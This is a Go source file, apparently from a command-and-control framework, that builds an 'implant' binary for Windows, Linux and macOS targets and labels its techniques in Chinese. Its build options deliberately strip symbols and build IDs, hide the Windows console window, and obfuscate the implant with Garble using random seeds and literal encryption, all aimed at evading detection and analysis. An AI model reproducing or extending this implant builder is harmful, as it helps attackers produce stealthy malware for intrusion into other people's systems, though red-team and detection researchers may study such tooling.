package payload

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func goBin() (string, error) {
	return exec.LookPath("go")
}

func targetGOOSArch(target string) (string, string, error) {
	switch target {
	case "windows-x64":
		return "windows", "amd64", nil
	case "linux-amd64":
		return "linux", "amd64", nil
	case "linux-arm64":
		return "linux", "arm64", nil
	case "darwin-amd64":
		return "darwin", "amd64", nil
	case "darwin-arm64":
		return "darwin", "arm64", nil
	default:
		return "", "", fmt.Errorf("%w: unknown target", ErrInvalid)
	}
}

func buildGo(ctx context.Context, req Request) (*Result, error) {
	gb, err := goBin()
	if err != nil {
		return nil, fmt.Errorf("%w: go toolchain", ErrNoCompiler)
	}
	root, err := moduleRoot()
	if err != nil {
		return nil, err
	}
	goos, arch, err := targetGOOSArch(req.Target)
	if err != nil {
		return nil, err
	}
	dir, err := os.MkdirTemp("", "c2-go-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(dir)
	out := filepath.Join(dir, "implant")
	ld := "-buildid="
	if req.Has("strip") {
		ld = "-s -w -buildid="
	}
	if req.Has("gui") && goos == "windows" {
		ld += " -H windowsgui"
	}
	env := append(os.Environ(), "GOOS="+goos, "GOARCH="+arch, "CGO_ENABLED=0")
	var cmd *exec.Cmd
	if req.Has("garble") && toolGarble() != "" {
		cmd = exec.CommandContext(ctx, toolGarble(), "-literals", "-tiny", "-seed=random", "build", "-trimpath", "-ldflags", ld, "-o", out, "./cmd/implant")
	} else {
		cmd = exec.CommandContext(ctx, gb, "build", "-trimpath", "-ldflags", ld, "-o", out, "./cmd/implant")
	}
	cmd.Dir = root
	cmd.Env = env
	b, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(b))
		if msg == "" {
			msg = err.Error()
		}
		if len(msg) > 800 {
			msg = msg[:800]
		}
		return nil, fmt.Errorf("compile failed: %s", msg)
	}
	raw, err := os.ReadFile(out)
	if err != nil {
		return nil, err
	}
	tech := []string{"Go 植入端", "现场编译"}
	if req.Has("strip") {
		tech = append(tech, "符号剥离")
	}
	if req.Has("gui") && goos == "windows" {
		tech = append(tech, "无窗口 GUI")
	}
	if req.Has("garble") && toolGarble() != "" {
		tech = append(tech, "Garble 混淆")
	}
	return finishBinary(req, raw, tech)
}

func moduleRoot() (string, error) {
	wd, err := os.Getwd()
	if err != nil {
		return "", err
	}
	dir := wd
	for i := 0; i < 8; i++ {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	if exe, err := os.Executable(); err == nil {
		dir = filepath.Dir(exe)
		for i := 0; i < 6; i++ {
			if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
				return dir, nil
			}
			parent := filepath.Dir(dir)
			if parent == dir {
				break
			}
			dir = parent
		}
	}
	return "", fmt.Errorf("module root not found")
}
